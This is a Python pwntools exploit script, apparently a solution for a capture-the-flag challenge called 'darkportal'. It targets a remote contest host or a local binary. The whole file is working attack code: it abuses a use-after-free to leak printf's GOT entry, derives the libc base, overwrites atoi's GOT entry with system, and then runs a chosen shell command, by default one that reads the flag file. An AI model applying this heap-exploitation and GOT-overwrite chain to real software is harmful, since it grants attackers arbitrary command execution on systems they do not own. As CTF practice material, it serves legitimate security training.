#!/usr/bin/env python3
from pwn import *
import re

context.binary = elf = ELF('./darkportal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.arch = 'i386'

HOST = 'dark-portal.putcyberdays.pl'
PORT = 8080


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(['/lib/ld-linux.so.2', './darkportal'], stdin=PIPE, stdout=PIPE)


def cmd(io, c):
    io.sendlineafter(b'> ', str(c).encode())


def create(io, name=b'A', size=0x20, content=b'B' * 31):
    cmd(io, 1)
    io.sendafter(b'Portal name: ', name + b'\n')
    io.sendafter(b'Content size: ', str(size).encode() + b'\n')
    if len(content) < size - 1:
        content = content.ljust(size - 1, b'A')
    io.sendafter(b'Content: ', content[: size - 1])


def delete(io, idx):
    cmd(io, 2)
    io.sendafter(b'Index: ', str(idx).encode() + b'\n')


def edit(io, idx, data):
    cmd(io, 3)
    io.sendafter(b'Index: ', str(idx).encode() + b'\n')
    io.sendafter(b'New content: ', data)


def note(io, size, data):
    cmd(io, 4)
    io.sendafter(b'Note size: ', str(size).encode() + b'\n')
    io.sendafter(b'Note content: ', data)


def activate(io, idx):
    cmd(io, 5)
    io.sendafter(b'Index: ', str(idx).encode() + b'\n')


def leak_printf(io):
    # portal 0 -> UAF overlap with fake portal, redirect content ptr to printf@GOT
    create(io, b'A', 0x20, b'B' * 31)
    delete(io, 0)
    fake = p32(elf.sym.default_vtable) + b'LEAK'.ljust(0x18, b'X') + p32(elf.got.printf)
    note(io, 0x20, fake)
    activate(io, 0)
    io.recvuntil(b'[*] Content: ')
    leak_line = io.recvline().rstrip(b'\n')
    if len(leak_line) < 4:
        raise ValueError(f'Leak too short: {leak_line!r}')
    return u32(leak_line[:4])


def overwrite_atoi_with_system(io, system_addr):
    # portal 1 -> UAF overlap with fake portal, redirect edit target to atoi@GOT
    create(io, b'B', 0x20, b'C' * 31)
    delete(io, 1)
    fake = p32(elf.sym.default_vtable) + b'WRITE'.ljust(0x18, b'Y') + p32(elf.got.atoi)
    note(io, 0x20, fake)
    edit(io, 1, p32(system_addr))


def trigger_command(io, command):
    # Once atoi@GOT is system, menu input becomes system(command)
    io.sendafter(b'> ', command)


def main():
    io = start()

    printf_leak = leak_printf(io)
    libc_base = printf_leak - libc.sym.printf
    system_addr = libc_base + libc.sym.system

    log.success(f'printf leak  : {hex(printf_leak)}')
    log.success(f'libc base    : {hex(libc_base)}')
    log.success(f'system       : {hex(system_addr)}')

    overwrite_atoi_with_system(io, system_addr)

    if args.CMD:
        cmdline = args.CMD.encode()
    else:
        cmdline = b'cat /h*/w*/f*'
    if b'\x00' not in cmdline:
        cmdline += b'\x00'
    trigger_command(io, cmdline)

    out = io.recvrepeat(2)
    print(out.decode('latin-1', errors='ignore'))

    m = re.search(rb'([A-Za-z0-9_\-]*\{[^\n\r\}]*\}|PUTCYBER\{[^\n\r\}]*\}|FLAG\{[^\n\r\}]*\})', out)
    if m:
        print(f'<FLAG>{m.group(1).decode(errors="ignore")}</FLAG>')

    io.close()


if __name__ == '__main__':
    main()
